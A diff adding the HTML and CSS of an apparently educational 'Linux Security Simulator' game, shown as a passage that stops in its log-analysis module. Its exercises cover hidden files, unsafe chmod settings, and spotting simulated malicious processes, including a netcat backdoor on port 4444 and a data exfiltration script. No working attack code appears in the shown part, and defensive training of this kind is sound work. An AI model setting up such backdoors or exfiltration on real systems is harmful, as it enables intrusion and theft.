@@ -1,0 +1,1381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>KERNEL — Linux Security Simulator</title>
+<link href="https://fonts.googleapis.com/css2?family=Martian+Mono:wght@300;400;500;600;700&family=Syne+Mono&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#000;--bg2:#060606;--surf:#0a0a0a;--pan:#0f0f0f;--pan2:#141414;
+  --brd:#1a1a1a;--brd2:#252525;--brd3:#303030;
+  --grn:#39ff14;--grn2:#7fff00;--grn3:#b8ff8b;--glo:rgba(57,255,20,.12);--glo2:rgba(57,255,20,.06);
+  --amb:#ff9500;--amb2:#ffb74d;--alo:rgba(255,149,0,.12);
+  --red:#ff3b30;--red2:#ff6b6b;--rlo:rgba(255,59,48,.1);
+  --blu:#0af;--blo:rgba(0,170,255,.1);
+  --wht:#e8e8e8;--mid:#555;--dim:#2a2a2a;
+  --scan:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(57,255,20,.015) 3px,rgba(57,255,20,.015) 4px);
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--grn);font-family:'Martian Mono',monospace;min-height:100vh;overflow-x:hidden;cursor:default;}
+body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;background:var(--scan);}
+body::after{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:radial-gradient(ellipse at 50% 0%,rgba(57,255,20,.04) 0%,transparent 60%);}
+.app{position:relative;z-index:1;display:flex;flex-direction:column;min-height:100vh;}
+
+/* ── HEADER ── */
+.hbar{height:1px;background:var(--grn);box-shadow:0 0 8px var(--grn);opacity:.6;}
+.hdr{background:rgba(0,0,0,.97);border-bottom:1px solid var(--brd2);position:sticky;top:0;z-index:50;backdrop-filter:blur(10px);}
+.hdr-in{max-width:1440px;margin:0 auto;padding:0 20px;height:52px;display:flex;align-items:center;gap:14px;}
+.logo{display:flex;align-items:center;gap:10px;flex-shrink:0;}
+.logo-bracket{color:var(--grn);font-size:22px;font-weight:700;text-shadow:0 0 12px var(--grn);}
+.logo-nm{font-family:'Syne Mono',monospace;font-size:18px;font-weight:400;color:var(--grn);letter-spacing:4px;text-shadow:0 0 10px rgba(57,255,20,.5);}
+.logo-tg{font-size:8px;color:var(--mid);letter-spacing:2px;margin-left:2px;}
+.hpills{display:flex;gap:6px;margin-left:12px;}
+.hpill{font-size:8px;letter-spacing:1.5px;padding:2px 9px;border-radius:2px;border:1px solid var(--brd2);color:var(--mid);background:var(--pan);display:flex;align-items:center;gap:5px;}
+.hdot{width:5px;height:5px;border-radius:50%;}
+.dl{background:var(--grn);box-shadow:0 0 6px var(--grn);animation:blink 1.4s step-end infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:.1;}}
+.hdr-r{margin-left:auto;display:flex;align-items:center;gap:8px;}
+.mission-tag{font-size:8px;letter-spacing:2px;padding:3px 11px;border-radius:2px;background:var(--rlo);border:1px solid rgba(255,59,48,.3);color:var(--red2);animation:pulseBorder 2s ease infinite;}
+@keyframes pulseBorder{0%,100%{border-color:rgba(255,59,48,.3);}50%{border-color:rgba(255,59,48,.7);}}
+
+/* ── NAV ── */
+.nav{background:var(--bg2);border-bottom:1px solid var(--brd);display:flex;padding:0 20px;overflow-x:auto;scrollbar-width:none;}
+.nav::-webkit-scrollbar{display:none;}
+.nb{font-size:9px;letter-spacing:1.5px;padding:0 15px;height:40px;color:var(--mid);cursor:pointer;border:none;background:none;text-transform:uppercase;white-space:nowrap;border-bottom:1px solid transparent;transition:all .2s;display:flex;align-items:center;gap:6px;}
+.nb:hover{color:var(--grn3);}
+.nb.on{color:var(--grn);border-bottom-color:var(--grn);background:var(--glo2);text-shadow:0 0 8px rgba(57,255,20,.4);}
+
+/* ── VIEWS ── */
+.main{flex:1;}
+.view{display:none;padding:24px 20px 80px;max-width:1440px;margin:0 auto;}
+.view.on{display:block;}
+
+/* View header */
+.vh{margin-bottom:22px;}
+.vh-tag{font-size:8px;letter-spacing:3px;text-transform:uppercase;color:var(--amb);margin-bottom:8px;display:flex;align-items:center;gap:8px;}
+.vh-tag::before{content:'//';color:var(--mid);margin-right:2px;}
+.vh-tt{font-family:'Syne Mono',monospace;font-size:clamp(18px,2.5vw,28px);color:var(--grn);margin-bottom:6px;text-shadow:0 0 16px rgba(57,255,20,.3);}
+.vh-sb{font-size:11px;color:var(--mid);line-height:1.7;max-width:680px;}
+
+/* Terminal window */
+.terminal{background:var(--bg2);border:1px solid var(--brd2);border-radius:6px;overflow:hidden;}
+.term-bar{display:flex;align-items:center;gap:6px;padding:8px 12px;background:var(--pan);border-bottom:1px solid var(--brd);}
+.tbtn{width:10px;height:10px;border-radius:50%;}
+.tbtn-r{background:#ff5f56;}.tbtn-y{background:#ffbd2e;}.tbtn-g{background:#27c93f;}
+.term-title{font-size:9px;color:var(--mid);letter-spacing:1.5px;margin-left:8px;}
+.term-body{padding:14px 16px;font-size:11px;line-height:2;min-height:180px;overflow-y:auto;max-height:380px;}
+.tl{opacity:0;animation:tlin .14s ease forwards;}
+@keyframes tlin{from{opacity:0;transform:translateX(-3px);}to{opacity:1;transform:none;}}
+.tg{color:var(--grn);}.ta{color:var(--amb2);}.tr{color:var(--red2);}.tb{color:var(--blu);}.td{color:var(--mid);}.tw{color:var(--wht);}
+.tgrn{color:var(--grn);font-weight:700;text-shadow:0 0 6px rgba(57,255,20,.5);}
+.tblink{animation:blk .65s step-end infinite;}@keyframes blk{0%,100%{opacity:1;}50%{opacity:0;}}
+.tprompt{color:var(--grn);}
+.t-warn{color:var(--amb);font-weight:600;}
+.t-threat{color:var(--red);font-weight:600;}
+
+/* Input line */
+.term-input-wrap{display:flex;align-items:center;gap:8px;padding:8px 16px 12px;border-top:1px solid var(--brd);}
+.tinput-prompt{color:var(--grn);font-size:11px;white-space:nowrap;}
+.tinput{flex:1;background:transparent;border:none;outline:none;color:var(--grn);font-family:'Martian Mono',monospace;font-size:11px;caret-color:var(--grn);}
+.tinput::placeholder{color:var(--dim);}
+
+/* Cards */
+.card{background:var(--surf);border:1px solid var(--brd);border-radius:6px;overflow:hidden;transition:border-color .2s;}
+.card:hover{border-color:var(--brd3);}
+.ch{padding:8px 14px;background:var(--pan);border-bottom:1px solid var(--brd);font-size:8px;letter-spacing:2px;text-transform:uppercase;color:var(--mid);display:flex;align-items:center;justify-content:space-between;}
+.cb{padding:16px;}
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+.g3{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;}
+.mb14{margin-bottom:14px;}.mb20{margin-bottom:20px;}.mb24{margin-bottom:24px;}
+
+/* Buttons */
+.btn{font-family:'Martian Mono',monospace;font-size:9px;letter-spacing:1.5px;padding:9px 16px;border-radius:4px;border:1px solid;cursor:pointer;text-transform:uppercase;transition:all .2s;display:inline-flex;align-items:center;gap:6px;}
+.btn-p{background:var(--grn);border-color:var(--grn);color:#000;font-weight:700;}
+.btn-p:hover{background:var(--grn2);box-shadow:0 0 20px rgba(57,255,20,.5);}
+.btn-g{background:transparent;border-color:var(--brd2);color:var(--mid);}
+.btn-g:hover{border-color:var(--grn);color:var(--grn);}
+.btn-r{background:var(--rlo);border-color:rgba(255,59,48,.4);color:var(--red2);}
+.btn-r:hover{background:rgba(255,59,48,.2);}
+.btn-a{background:var(--alo);border-color:rgba(255,149,0,.4);color:var(--amb2);}
+
+/* Badges */
+.bdg{font-size:8px;letter-spacing:1px;padding:2px 8px;border-radius:2px;border:1px solid;display:inline-flex;align-items:center;gap:4px;}
+.bdg-g{color:var(--grn);border-color:rgba(57,255,20,.3);background:var(--glo);}
+.bdg-r{color:var(--red2);border-color:rgba(255,59,48,.3);background:var(--rlo);}
+.bdg-a{color:var(--amb2);border-color:rgba(255,149,0,.3);background:var(--alo);}
+.bdg-b{color:var(--blu);border-color:rgba(0,170,255,.3);background:var(--blo);}
+
+/* Mission box */
+.mission{background:var(--bg2);border:1px solid rgba(255,149,0,.3);border-left:3px solid var(--amb);border-radius:4px;padding:12px 16px;margin-bottom:18px;font-size:11px;}
+.mission-title{color:var(--amb);font-size:8px;letter-spacing:3px;margin-bottom:6px;}
+.mission-body{color:var(--wht);line-height:1.7;}
+
+/* Progress/status */
+.status-bar{display:flex;align-items:center;gap:14px;padding:8px 14px;background:var(--pan);border:1px solid var(--brd);border-radius:4px;font-size:9px;margin-bottom:16px;}
+.sbi{display:flex;align-items:center;gap:5px;}
+
+/* Objective tracker */
+.obj-list{display:flex;flex-direction:column;gap:6px;}
+.obj-item{display:flex;align-items:center;gap:10px;padding:7px 12px;background:var(--pan);border:1px solid var(--brd);border-radius:4px;font-size:10px;color:var(--mid);transition:all .3s;}
+.obj-item.done{color:var(--grn);border-color:rgba(57,255,20,.25);}
+.obj-item.done::before{content:'✓';color:var(--grn);margin-right:2px;}
+.obj-item.fail{color:var(--red);border-color:rgba(255,59,48,.25);}
+
+/* Permissions table */
+.perm-table{border-collapse:collapse;width:100%;font-size:10px;}
+.perm-table th{padding:6px 10px;background:var(--pan);color:var(--amb);text-align:left;border-bottom:1px solid var(--brd2);letter-spacing:1px;}
+.perm-table td{padding:7px 10px;border-bottom:1px solid var(--brd);color:var(--mid);}
+.perm-table tr:last-child td{border-bottom:none;}
+.perm-table tr:hover td{background:rgba(57,255,20,.03);color:var(--wht);}
+
+/* Command ref */
+.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:10px;}
+.cmd-card{background:var(--pan);border:1px solid var(--brd);border-radius:4px;padding:11px 13px;transition:all .2s;cursor:pointer;}
+.cmd-card:hover{border-color:var(--brd3);background:var(--pan2);}
+.cmd-code{color:var(--grn);font-size:11px;font-weight:600;margin-bottom:3px;text-shadow:0 0 4px rgba(57,255,20,.25);}
+.cmd-desc{font-size:9px;color:var(--mid);line-height:1.5;}
+.cmd-sec{color:var(--amb);font-size:8px;margin-top:4px;letter-spacing:.5px;}
+
+/* Run level table */
+.rl-table{border-collapse:collapse;width:100%;font-size:10px;margin-bottom:14px;}
+.rl-table th{padding:7px 12px;background:var(--pan);color:var(--grn);text-align:left;border-bottom:1px solid var(--brd2);letter-spacing:1px;font-size:9px;}
+.rl-table td{padding:8px 12px;border-bottom:1px solid var(--brd);color:var(--mid);}
+.rl-table tr:hover td{background:var(--glo2);color:var(--wht);}
+.rl-num{color:var(--amb2);font-weight:600;}
+
+/* Process table */
+.proc-table{border-collapse:collapse;width:100%;font-size:10px;}
+.proc-table th{padding:5px 8px;background:var(--pan);color:var(--amb);text-align:left;border-bottom:1px solid var(--brd2);font-size:9px;letter-spacing:1px;}
+.proc-table td{padding:6px 8px;border-bottom:1px solid var(--brd);color:var(--mid);}
+.proc-suspicious{background:rgba(255,59,48,.05);animation:suspGlow .8s ease infinite;}
+@keyframes suspGlow{0%,100%{background:rgba(255,59,48,.04);}50%{background:rgba(255,59,48,.1);}}
+.proc-table tr.proc-suspicious td{color:var(--red2);}
+.proc-table tr.proc-killed td{opacity:.3;text-decoration:line-through;}
+
+/* Firewall rules */
+.fw-rule{display:flex;align-items:center;gap:8px;padding:8px 12px;background:var(--pan);border:1px solid var(--brd);border-radius:4px;margin-bottom:6px;font-size:10px;animation:fadeUp .2s ease;}
+@keyframes fadeUp{from{opacity:0;transform:translateY(4px);}to{opacity:1;transform:none;}}
+.fw-accept{border-left:3px solid var(--grn);}
+.fw-drop{border-left:3px solid var(--red);}
+.fw-rule-target{width:70px;font-weight:600;}
+.fw-rule-proto{width:50px;color:var(--blu);}
+.fw-rule-port{width:80px;color:var(--amb);}
+.fw-rule-desc{flex:1;color:var(--mid);}
+
+/* Security measure cards */
+.sec-card{background:var(--pan);border:1px solid var(--brd);border-radius:6px;padding:14px;margin-bottom:10px;transition:all .3s;}
+.sec-card.complete{border-color:rgba(57,255,20,.3);background:rgba(57,255,20,.03);}
+.sec-card.active{border-color:rgba(255,149,0,.4);background:rgba(255,149,0,.04);}
+.sec-card-hdr{display:flex;align-items:center;gap:10px;margin-bottom:8px;}
+.sec-card-icon{font-size:16px;}
+.sec-card-title{color:var(--wht);font-size:11px;font-weight:600;flex:1;}
+.sec-card-status{font-size:8px;letter-spacing:1px;}
+.sec-card-body{font-size:10px;color:var(--mid);line-height:1.7;}
+.sec-cmd{display:inline-block;background:var(--bg2);border:1px solid var(--brd2);border-radius:3px;padding:2px 7px;color:var(--grn);margin:2px;font-size:9px;}
+
+/* Quiz */
+.qbar{display:flex;gap:4px;margin-bottom:20px;}
+.qd{flex:1;height:3px;border-radius:2px;background:var(--brd2);transition:background .3s;}
+.qd.done{background:var(--grn);}
+.qd.active{background:var(--amb);}
+.qcard{background:var(--surf);border:1px solid var(--brd);border-radius:6px;padding:24px;max-width:740px;margin:0 auto;animation:fadeUp .3s ease;}
+.qnum{font-size:8px;letter-spacing:2px;color:var(--mid);margin-bottom:10px;}
+.qtxt{font-family:'Syne Mono',monospace;font-size:18px;color:var(--grn);margin-bottom:20px;line-height:1.4;text-shadow:0 0 8px rgba(57,255,20,.2);}
+.qopts{display:flex;flex-direction:column;gap:7px;}
+.qopt{background:var(--pan);border:1px solid var(--brd2);border-radius:4px;padding:11px 14px;cursor:pointer;transition:all .2s;font-size:10px;color:var(--mid);display:flex;align-items:center;gap:10px;}
+.qopt:hover:not(.ans){border-color:var(--grn);color:var(--grn);}
+.qopt.correct{border-color:var(--grn);background:var(--glo);color:var(--grn3);}
+.qopt.wrong{border-color:var(--red);background:var(--rlo);color:var(--red2);}
+.qi{width:24px;height:24px;border-radius:3px;background:var(--surf);border:1px solid var(--brd);color:var(--mid);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;flex-shrink:0;}
+.qfb{margin-top:13px;padding:12px;border-radius:4px;font-size:10px;line-height:1.7;display:none;animation:fadeUp .2s ease;}
+.qfb.on{display:block;}
+.qsc{background:var(--bg2);border:1px solid var(--grn);border-radius:6px;padding:36px;max-width:740px;margin:0 auto;text-align:center;display:none;animation:fadeUp .4s ease;}
+.qsc.on{display:block;}
+.qsn{font-family:'Syne Mono',monospace;font-size:72px;color:var(--grn);text-shadow:0 0 20px rgba(57,255,20,.4);}
+.qsl{font-size:9px;color:var(--mid);letter-spacing:2.5px;margin-top:4px;}
+.qsm{font-size:11px;color:var(--mid);margin-top:12px;line-height:1.8;}
+
+/* Scrollbar */
+::-webkit-scrollbar{width:4px;height:4px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--brd2);border-radius:2px;}
+::-webkit-scrollbar-thumb:hover{background:var(--brd3);}
+
+@media(max-width:900px){.g2,.g3{grid-template-columns:1fr;}.view{padding:14px 12px 60px;}}
+</style>
+</head>
+<body>
+<div class="app">
+<div class="hbar"></div>
+<header class="hdr"><div class="hdr-in">
+  <div class="logo">
+    <span class="logo-bracket">[</span>
+    <span class="logo-nm">KERNEL</span>
+    <span class="logo-bracket">]</span>
+    <div><div class="logo-tg" style="margin-top:2px">Linux Security Simulator</div></div>
+  </div>
+  <div class="hpills">
+    <div class="hpill"><div class="hdot dl"></div>LIVE</div>
+    <div class="hpill">IBM Linux Security</div>
+  </div>
+  <div class="hdr-r"><div class="mission-tag">⚠ SERVER COMPROMISED</div></div>
+</div></header>
+
+<nav class="nav">
+  <button class="nb on" onclick="sv('ref')">01 Command Ref</button>
+  <button class="nb" onclick="sv('fs')">02 File System</button>
+  <button class="nb" onclick="sv('perms')">03 Permissions</button>
+  <button class="nb" onclick="sv('proc')">04 Process Hunter</button>
+  <button class="nb" onclick="sv('log')">05 Log Detective</button>
+  <button class="nb" onclick="sv('fw')">06 Firewall</button>
+  <button class="nb" onclick="sv('sec')">07 Hardening</button>
+  <button class="nb" onclick="sv('qz')">08 Quiz</button>
+</nav>
+
+<div class="main">
+
+<!-- ═══ M1: COMMAND REFERENCE ═══ -->
+<div class="view on" id="v-ref">
+<div class="vh"><div class="vh-tag">Module 01 — Reference</div><div class="vh-tt">Linux Command Library</div><div class="vh-sb">All commands from the IBM reading organized by category. Each includes the security lesson it teaches. Click any command to see it in action.</div></div>
+
+<div class="g2 mb20">
+<div>
+<div class="card mb14">
+  <div class="ch">Run Levels — System States</div>
+  <div class="cb" style="padding:10px;">
+    <table class="rl-table">
+      <tr><th>Level</th><th>Name</th><th>Description</th></tr>
+      <tr><td class="rl-num">0</td><td><span class="bdg bdg-r">HALT</span></td><td>Stop all system operations</td></tr>
+      <tr><td class="rl-num">1</td><td><span class="bdg bdg-a">Single User</span></td><td>Root only — maintenance mode</td></tr>
+      <tr><td class="rl-num">2</td><td><span class="bdg bdg-b">Multi-User</span></td><td>Multiple users, no NFS sharing</td></tr>
+      <tr><td class="rl-num">3</td><td><span class="bdg bdg-b">Full Multi-User</span></td><td>Text-based, full capabilities</td></tr>
+      <tr><td class="rl-num">4</td><td><span class="bdg">Undefined</span></td><td>Reserved for custom use</td></tr>
+      <tr><td class="rl-num">5</td><td><span class="bdg bdg-g">Full GUI</span></td><td>Multi-user with graphical UI</td></tr>
+      <tr><td class="rl-num">6</td><td><span class="bdg bdg-a">Reboot</span></td><td>Restart all operations</td></tr>
+    </table>
+  </div>
+</div>
+<div class="terminal">
+  <div class="term-bar"><div class="tbtn tbtn-r"></div><div class="tbtn tbtn-y"></div><div class="tbtn tbtn-g"></div><div class="term-title">init — Run Level Control</div></div>
+  <div class="term-body" id="ref-term">
+    <span class="td">// KERNEL Linux Security Simulator initialized</span><br>
+    <span class="td">// Click any command card to see a live demo</span><br>
+    <span class="tprompt">root@server:~# </span><span class="tblink">█</span>
+  </div>
+</div>
+</div>
+<div>
+<div class="cmd-grid" id="cmd-grid"></div>
+</div>
+</div>
+</div>
+
+<!-- ═══ M2: FILE SYSTEM ADVENTURE ═══ -->
+<div class="view" id="v-fs">
+<div class="vh"><div class="vh-tag">Module 02 — File System</div><div class="vh-tt">File System Adventure</div><div class="vh-sb">Navigate a virtual compromised Linux server. Use ls, cd, cat, pwd, and sudo to find hidden files and flags. Every discovery teaches a security lesson.</div></div>
+
+<div class="mission"><div class="mission-title">⚠ MISSION BRIEFING</div><div class="mission-body">A web server has been compromised. Intelligence suggests the attacker left traces in hidden files and directories. Your objective: navigate the filesystem, find the hidden flag, and understand HOW the attacker concealed their presence.</div></div>
+
+<div class="status-bar">
+  <div class="sbi"><span class="td">PWD:</span> <span class="tg" id="fs-pwd">/home/investigator</span></div>
+  <div class="sbi"><span class="td">USER:</span> <span class="tg">investigator</span></div>
+  <div class="sbi"><span class="td">FLAGS:</span> <span id="fs-flags" class="ta">0 / 3</span></div>
+  <div style="margin-left:auto;display:flex;align-items:center;gap:8px;"><span class="bdg bdg-r" id="fs-threat-badge">THREAT LEVEL: HIGH</span><button class="btn btn-g" onclick="resetFS()">↺ Reset</button></div>
+</div>
+
+<div class="g2">
+<div>
+  <div class="terminal mb14">
+    <div class="term-bar"><div class="tbtn tbtn-r"></div><div class="tbtn tbtn-y"></div><div class="tbtn tbtn-g"></div><div class="term-title">forensic-server — /home/investigator</div></div>
+    <div class="term-body" id="fs-term" style="min-height:320px"></div>
+    <div class="term-input-wrap">
+      <span class="tinput-prompt">investigator@forensic-server:~$ </span>
+      <input class="tinput" id="fs-input" placeholder="type a command..." autocomplete="off" spellcheck="false" />
+    </div>
+  </div>
+  <div style="display:flex;gap:6px;flex-wrap:wrap;">
+    <button class="btn btn-g" onclick="fsCmd('ls -la')">ls -la</button>
+    <button class="btn btn-g" onclick="fsCmd('pwd')">pwd</button>
+    <button class="btn btn-g" onclick="fsCmd('cat README.txt')">cat README</button>
+    <button class="btn btn-g" onclick="fsCmd('cd /var/log')">cd /var/log</button>
+    <button class="btn btn-g" onclick="fsCmd('sudo ls -la /var/log/private')">sudo ls</button>
+    <button class="btn btn-g" onclick="fsCmd('cat /var/log/private/.shell.sh')">cat .shell.sh</button>
+    <button class="btn btn-g" onclick="fsCmd('find / -name "*.sh" 2>/dev/null')">find *.sh</button>
+  </div>
+</div>
+<div>
+  <div class="card mb14">
+    <div class="ch">Objectives</div>
+    <div class="cb"><div class="obj-list" id="fs-objs">
+      <div class="obj-item" id="obj-ls">Run <code>ls -la</code> to see hidden files (dotfiles)</div>
+      <div class="obj-item" id="obj-nav">Navigate to /var/log directory</div>
+      <div class="obj-item" id="obj-priv">Discover suspicious private/ directory</div>
+      <div class="obj-item" id="obj-shell">Examine the hidden .shell.sh script</div>
+      <div class="obj-item" id="obj-find">Use find to locate all .sh scripts</div>
+      <div class="obj-item" id="obj-flag">Capture all 3 flags</div>
+    </div></div>
+  </div>
+  <div class="card">
+    <div class="ch">Security Lessons</div>
+    <div class="cb" id="fs-lessons" style="font-size:10px;color:var(--mid);line-height:1.9;">
+      <div>→ Dotfiles (starting with <code style="color:var(--grn)">"."</code>) are hidden from regular ls</div>
+      <div>→ Always use <code style="color:var(--grn)">ls -la</code> to reveal ALL files</div>
+      <div>→ Attackers hide scripts in system directories</div>
+      <div>→ <code style="color:var(--grn)">find</code> can traverse the entire filesystem</div>
+    </div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ═══ M3: PERMISSIONS ═══ -->
+<div class="view" id="v-perms">
+<div class="vh"><div class="vh-tag">Module 03 — chmod / chown</div><div class="vh-tt">Permission Challenges</div><div class="vh-sb">Identify dangerously misconfigured file permissions and fix them using chmod. Learn why chmod 777 is a critical security risk.</div></div>
+
+<div class="mission"><div class="mission-title">⚠ SECURITY AUDIT ACTIVE</div><div class="mission-body">A security audit has flagged 4 files with dangerous permission settings. Use chmod to fix each one. The attacker exploited world-writable files to inject malicious code.</div></div>
+
+<div class="g2">
+<div>
+  <div class="terminal mb14">
+    <div class="term-bar"><div class="tbtn tbtn-r"></div><div class="tbtn tbtn-y"></div><div class="tbtn tbtn-g"></div><div class="term-title">permissions-lab</div></div>
+    <div class="term-body" id="perm-term" style="min-height:260px"></div>
+    <div class="term-input-wrap">
+      <span class="tinput-prompt">user@server:~$ </span>
+      <input class="tinput" id="perm-input" placeholder="chmod 755 filename..." autocomplete="off" spellcheck="false" />
+    </div>
+  </div>
+  <div style="display:flex;gap:6px;flex-wrap:wrap;">
+    <button class="btn btn-g" onclick="permCmd('ls -l')">ls -l</button>
+    <button class="btn btn-a" onclick="permCmd('chmod 755 deploy.sh')">fix deploy.sh</button>
+    <button class="btn btn-a" onclick="permCmd('chmod 640 config.env')">fix config.env</button>
+    <button class="btn btn-a" onclick="permCmd('chmod 644 index.html')">fix index.html</button>
+    <button class="btn btn-a" onclick="permCmd('chmod 600 .ssh/id_rsa')">fix id_rsa</button>
+    <button class="btn btn-g" onclick="resetPerms()">↺ Reset</button>
+  </div>
+</div>
+<div>
+  <div class="card mb14">
+    <div class="ch">Permission Reference — Octal System</div>
+    <div class="cb" style="padding:10px;">
+      <table class="perm-table">
+        <tr><th>Octal</th><th>Binary</th><th>Permissions</th><th>Use Case</th></tr>
+        <tr><td style="color:var(--grn)">777</td><td>111 111 111</td><td style="color:var(--red2)">rwxrwxrwx</td><td style="color:var(--red2)">DANGEROUS — never use</td></tr>
+        <tr><td style="color:var(--grn)">755</td><td>111 101 101</td><td>rwxr-xr-x</td><td>Executables, directories</td></tr>
+        <tr><td style="color:var(--grn)">644</td><td>110 100 100</td><td>rw-r--r--</td><td>Regular files, HTML</td></tr>
+        <tr><td style="color:var(--grn)">640</td><td>110 100 000</td><td>rw-r-----</td><td>Config with group read</td></tr>
+        <tr><td style="color:var(--grn)">600</td><td>110 000 000</td><td>rw-------</td><td>Private keys, passwords</td></tr>
+        <tr><td style="color:var(--grn)">400</td><td>100 000 000</td><td>r--------</td><td>Read-only private files</td></tr>
+      </table>
+    </div>
+  </div>
+  <div class="card">
+    <div class="ch">Fixed Files</div>
+    <div class="cb"><div class="obj-list" id="perm-objs">
+      <div class="obj-item" id="pobj-deploy" style="color:var(--red2)">⚠ deploy.sh — 777 WORLD WRITABLE</div>
+      <div class="obj-item" id="pobj-config" style="color:var(--red2)">⚠ config.env — 666 WORLD WRITABLE</div>
+      <div class="obj-item" id="pobj-index" style="color:var(--red2)">⚠ index.html — 777 WORLD WRITABLE</div>
+      <div class="obj-item" id="pobj-sshkey" style="color:var(--red2)">⚠ .ssh/id_rsa — 644 KEY EXPOSED</div>
+    </div></div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ═══ M4: PROCESS HUNTER ═══ -->
+<div class="view" id="v-proc">
+<div class="vh"><div class="vh-tag">Module 04 — ps / kill</div><div class="vh-tt">Process Hunter</div><div class="vh-sb">Use ps aux to identify malicious processes running on the compromised server. Find the cryptominer, the backdoor listener, and the data exfiltration script — then terminate them.</div></div>
+
+<div class="mission"><div class="mission-title">⚠ ANOMALOUS PROCESSES DETECTED</div><div class="mission-body">System monitoring flagged unusual CPU and network activity. Three malicious processes are running. Use <code style="color:var(--grn)">ps aux</code> to identify them, then <code style="color:var(--grn)">kill -9 &lt;PID&gt;</code> to terminate. Check with <code style="color:var(--grn)">netstat -tlnp</code> for backdoor ports.</div></div>
+
+<div class="g2">
+<div>
+  <div class="terminal mb14">
+    <div class="term-bar"><div class="tbtn tbtn-r"></div><div class="tbtn tbtn-y"></div><div class="tbtn tbtn-g"></div><div class="term-title">process-monitor</div></div>
+    <div class="term-body" id="proc-term" style="min-height:260px"></div>
+    <div class="term-input-wrap">
+      <span class="tinput-prompt">user@server:~$ </span>
+      <input class="tinput" id="proc-input" placeholder="ps aux, kill -9 PID..." autocomplete="off" spellcheck="false" />
+    </div>
+  </div>
+  <div style="display:flex;gap:6px;flex-wrap:wrap;">
+    <button class="btn btn-g" onclick="procCmd('ps aux')">ps aux</button>
+    <button class="btn btn-g" onclick="procCmd('netstat -tlnp')">netstat -tlnp</button>
+    <button class="btn btn-r" onclick="procCmd('kill -9 1337')">kill 1337</button>
+    <button class="btn btn-r" onclick="procCmd('kill -9 1338')">kill 1338</button>
+    <button class="btn btn-r" onclick="procCmd('kill -9 1339')">kill 1339</button>
+    <button class="btn btn-g" onclick="procCmd('ps aux | grep attacker')">grep attacker</button>
+    <button class="btn btn-g" onclick="resetProc()">↺ Reset</button>
+  </div>
+</div>
+<div>
+  <div class="card mb14">
+    <div class="ch">Process Watch — Live</div>
+    <div class="cb" style="padding:8px;">
+      <table class="proc-table" id="proc-table">
+        <tr><th>PID</th><th>USER</th><th>CPU%</th><th>COMMAND</th><th>THREAT</th></tr>
+      </table>
+    </div>
+  </div>
+  <div class="card">
+    <div class="ch">Eliminated Processes</div>
+    <div class="cb"><div class="obj-list" id="proc-kills">
+      <div class="obj-item" id="pkill-1337">PID 1337 — cryptominer (99% CPU)</div>
+      <div class="obj-item" id="pkill-1338">PID 1338 — nc backdoor (port 4444)</div>
+      <div class="obj-item" id="pkill-1339">PID 1339 — data exfil script</div>
+    </div></div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ═══ M5: LOG DETECTIVE ═══ -->
+<div class="view" id="v-log">
+<div class="vh"><div class="vh-tag">Module 05 — grep / journalctl</div><div class="vh-tt">Log Detective</div><div class="vh-sb">Analyze auth.log to uncover a brute-force SSH attack. Use grep with patterns to filter log entries, identify the attacker's IP, and block it with fail2ban.</div></div>
+
+<div class="mission"><div class="mission-title">⚠ INTRUSION DETECTION ALERT</div><div class="mission-body">The auth.log shows suspicious activity starting at 03:15 AM. An attacker has been systematically brute-forcing SSH. Find the attack pattern, identify the source IP, confirm the breach, and ban the attacker.</div></div>
+
+<div class="g2">
+<div>
+  <div class="terminal mb14">
+    <div class="term-bar"><div class="tbtn tbtn-r"></div><div class="tbtn tbtn-y"></div><div class="tbtn tbtn-g"></div><div class="term-title">log-analysis — /var/log/auth.log</div></div>
+    <div class="term-body" id="log-term" style="min-height:280px;max-height:340px"></div>
+    <div class="term-input-wrap">
+      <span class="tinput-prompt">investigator@server:~$ </span>
+      <input class="tinput" id="log-input" placeholder="grep 'Failed' /var/log/auth.log..." autocomplete="off" spellcheck="false" />
+    </div>
+  </div>
+  <div style="display:flex;gap:6px;flex-wrap:wrap;">
+    <button class="btn btn-g" onclick="logCmd('cat /var/log/auth.log | head -20')">head auth.log</button>
+    <button class="btn btn-g" onclick="logCmd('grep &quot;Failed password&quot; /var/log/auth.log')">grep Failed</button>
+    <button class="btn btn-g" onclick="logCmd('grep &quot;Accepted password&quot; /var/log/auth.log')">grep Accepted</button>
+    <button class="btn btn-g" onclick="logCmd('journalctl -u ssh --since today')">journalctl</button>
+    <button class="btn btn-r" onclick="logCmd('sudo fail2ban-client set sshd banip 203.0.113.42')">ban IP</button>
+    <button class="btn btn-g" onclick="logCmd('grep -c Failed /var/log/auth.log')">count failures</button>
+    <button class="btn btn-g" onclick="resetLog()">↺ Reset</button>
+  </div>
+</div>
+<div>
+  <div class="card mb14">
+    <div class="ch">Investigation Progress</div>
+    <div class="cb"><div class="obj-list" id="log-objs">
+      <div class="obj-item" id="lobj-view">View raw auth.log contents</div>
+      <div class="obj-item" id="lobj-grep">Use grep to filter failed logins</div>
+      <div class="obj-item" id="lobj-count">Count total failed attempts</div>
+      <div class="obj-item" id="lobj-breach">Identify the successful breach</div>
+      <div class="obj-item" id="lobj-ban">Ban the attacker's IP with fail2ban</div>
+    </div></div>
+  </div>
+  <div class="card">
+    <div class="ch">Attack Pattern Analysis</div>
+    <div class="cb" id="log-analysis" style="font-size:10px;color:var(--mid);line-height:1.9;">
+      <div>→ Run <span style="color:var(--grn)">grep "Failed"</span> to see brute force attempts</div>
+      <div>→ Brute force: many failures from same IP, short timeframe</div>
+      <div>→ <span style="color:var(--grn)">grep "Accepted"</span> confirms if attack succeeded</div>
